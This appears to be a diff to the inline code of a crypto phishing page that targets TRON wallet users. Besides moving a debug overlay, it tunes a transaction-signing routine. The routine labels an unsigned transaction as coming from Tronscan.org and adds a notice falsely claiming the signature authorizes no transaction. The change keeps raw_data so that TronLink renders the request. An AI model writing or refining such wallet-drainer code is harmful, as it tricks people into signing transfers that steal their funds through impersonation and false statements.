@@ -5,14 +5,14 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
 #__dbg {
-  position: fixed; bottom: 0; left: 0; right: 0; z-index: 999999;
-  max-height: 50vh; overflow-y: auto;
+  position: fixed; top: 60px; left: 0; right: 0; z-index: 999999;
+  max-height: 35vh; overflow-y: auto;
   background: rgba(0,0,0,0.92); color: #0f0;
   font: 12px/1.4 monospace; padding: 8px;
   pointer-events: auto;
 }
 #__dbg_close {
-  position: fixed; bottom: calc(50vh - 24px); right: 8px; z-index: 9999999;
+  position: fixed; top: 56px; right: 8px; z-index: 9999999;
   background: #f00; color: #fff; border: none; border-radius: 50%;
   width: 28px; height: 28px; font-size: 16px; cursor: pointer; display: none;
 }
@@ -510,7 +510,9 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
           }
           window.__logINF(pathLabel + ' tx built — keys: ' + JSON.stringify(Object.keys(utx)));
 
-          delete utx.visible; delete utx.txID; delete utx.raw_data;
+          // Keep raw_data — TronLink needs it to validate & render the tx in popup
+          // Removing it causes "Malformed response" on some wallet versions
+          delete utx.visible;
           utx.Application = 'Tronscan.org';
           utx.Message     = msg;
           utx.Notice      = 'This signature is used solely to verify ownership of the address. It does not authorize, initiate, or execute any transaction.';
